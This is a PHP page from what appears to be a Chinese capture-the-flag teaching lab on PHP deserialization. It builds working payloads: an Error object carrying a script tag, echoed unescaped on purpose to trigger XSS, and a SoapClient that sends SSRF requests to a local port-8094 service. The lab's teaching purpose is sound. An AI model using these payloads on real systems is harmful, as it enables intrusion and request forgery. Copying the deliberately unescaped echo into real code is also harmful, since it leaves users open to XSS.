<?php
// ============================================
// L9 demo：原生类武器库 · 现场实验台
// 每件武器一个实验：点链接 -> 当场造弹 -> 反序列化 -> 看效果
// ============================================
error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED);
$w = isset($_GET['w']) ? $_GET['w'] : '';
function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES); }
?>
<!DOCTYPE html>
<html lang="zh">
<head><meta charset="utf-8"><title>L9 demo · 原生类武器库</title></head>
<body style="font-family: sans-serif; max-width: 760px; margin: 40px auto;">
<h1>🧰 L9 demo：原生类武器库</h1>

<h2>〇、什么叫"原生类"？</h2>
<p>反序列化造对象只认一件事：<strong>这个名字的类存在</strong>。它不管这个类是程序员写的，还是 PHP 自己带来的。
PHP 出厂就自带了 <strong><?php echo count(get_declared_classes()); ?> 个类</strong>（本机实测）——
就算目标网站一行类都不写，你的弹药串里也可以写它们的名字。</p>
<pre style="background:#f6f6f6; padding:10px;">$classes = get_declared_classes();   // 数一数 PHP 自带了什么
// 抽样：stdClass, Exception, Error, SoapClient, SplFileObject, ...</pre>

<h2>一、武器一：Error —— 自带 __toString 的"回显炸弹"</h2>
<p>L3 讲过：echo 一个对象会触发 <code>__toString</code>。自定义类十有八九没写它，
但 PHP 自带的 <code>Error</code>/<code>Exception</code> <strong>出厂自带</strong>——echo 它必炸出一段错误文本，文本里含 message 属性。
message 是你造弹时塞进去的……塞个 <code>&lt;script&gt;</code> 就是 XSS。</p>
<p><a href="?w=1">▶ 实弹演示：造 Error 弹 → 反序列化 → echo（注意弹窗）</a></p>
<?php if ($w === '1'): ?>
<pre style="background:#f6f6f6; padding:10px;">// 造弹（图纸原样，注意 protected 属性带 \0*\0 前缀——所以它没法直接塞 URL，网页表单/POST 也难传）：
<?php
$payload1 = serialize(new Error('<script>alert(1)</script>', 42));
echo h($payload1);
?>
// 三步引爆：
$obj = unserialize($payload1);
echo $obj;          // &lt;-- __toString 出场，message 原样吐进 HTML</pre>
<p><strong>危险输出区（下面这段是 echo $obj 的原样输出，XSS 就在此处发生）：</strong></p>
<div style="border:2px dashed #c00; padding:10px;">
<?php
    $obj = unserialize($payload1);
    echo $obj;   // 故意不转义：让 <script> 真的执行，演示 XSS
?>
</div>
<p style="color:#888">没看到弹窗说明你手快关了，刷新重按一次。真实场景里这就是打别人网站的反射点。</p>
<?php endif; ?>

<h2>二、收货名单：unserialize 不是什么都收</h2>
<p>原生类 ≠ 全能武器库。实测（PHP 7.0.9）：<strong>unserialize 只收实现了序列化协议的类</strong>。
常用的两件大杀器都在名单上，但很多"看起来能用"的类（读文件的 SplFileObject、列目录的 GlobIterator）<strong>被拒收</strong>——
serialize 它们直接抛异常，手搓串 unserialize 也吐 false。</p>
<table border="1" cellpadding="6" style="border-collapse: collapse;">
<tr><th>原生类</th><th>收吗</th><th>武器价值</th></tr>
<tr><td>SoapClient</td><td>✅ 收</td><td>⭐⭐⭐ __call → SSRF（本课主武器）</td></tr>
<tr><td>Error / Exception</td><td>✅ 收</td><td>⭐⭐ __toString → 回显/XSS</td></tr>
<tr><td>stdClass</td><td>✅ 收</td><td>无（一个魔术方法都没有，纯占位）</td></tr>
<tr><td>SplFileObject / GlobIterator / DirectoryIterator / SimpleXMLElement</td><td>❌ 拒收</td><td>序列化协议没实现，进不了弹</td></tr>
</table>

<h2>三、武器二：SoapClient —— __call 出膛就是一发 HTTP 请求（SSRF）</h2>
<p>SoapClient 是 PHP 的 SOAP 客户端（SOAP = 一种"用 HTTP 传送结构化调用"的老协议）。
它的两个关键属性：<code>location</code>（请求打到哪里）和 <code>uri</code>（命名空间）。
调用它<strong>任何</strong>不存在的方法，都会触发 <code>__call</code>：把方法名包成 SOAP 请求，POST 到 location 指的地址。</p>
<p>也就是说：<strong>只要能反序列化出一个 SoapClient，再让代码碰到它的方法调用，你就获得了一次"借服务器之手"发 HTTP 的机会</strong>——这就是 SSRF（服务端请求伪造）。打内网、探服务、传数据，全靠它。</p>
<pre style="background:#f6f6f6; padding:10px;">// 造弹（无 \0 字节，URL 直传无障碍——跟 Error 不一样）：
<?php
$payload2 = serialize(new SoapClient(null, array(
    'uri'      => 'http://127.0.0.1:8094/',
    'location' => 'http://127.0.0.1:8094/demo_soap.php',
)));
echo h($payload2);
?>
// 引爆：
$obj = unserialize($payload2);
$obj->随便什么方法名();   // SoapClient 没这方法 -> __call -> 请求已发出
// 对端如果用 SOAP Fault 回话，SoapClient 会抛异常，异常消息 = faultstring</pre>
<p><a href="?w=3">▶ 实弹演示：SoapClient 弹 → 调方法 → 打内网 8094 的 demo 端点</a></p>
<?php if ($w === '3'): ?>
<p><strong>引爆结果：</strong></p>
<pre style="background:#f6f6f6; padding:10px;"><?php
    $obj = unserialize($payload2);
    try {
        $r = $obj->health_check();
        echo "__call 返回：\n"; var_dump($r);
    } catch (SoapFault $e) {
        echo "SoapFault 接住了，getMessage() 是：\n";
        echo h($e->getMessage()), "\n";
    } catch (Throwable $t) {
        echo "别的异常：", h($t->getMessage()), "\n";
        echo "（如果是连接失败——内网服务 8094 没启动，跑一下 start-labs.cmd）\n";
    }
?></pre>
<?php endif; ?>

<hr>
<p style="color:#888">demo 到此为止——Error 是"回显炸弹"，SoapClient 是"借手开火"。
真正的挑战在 <a href="/index.php">index.php</a>：那里一个自定义类都没有，旗在内网 8094 的 flag_l9.php 手里。</p>
</body>
</html>
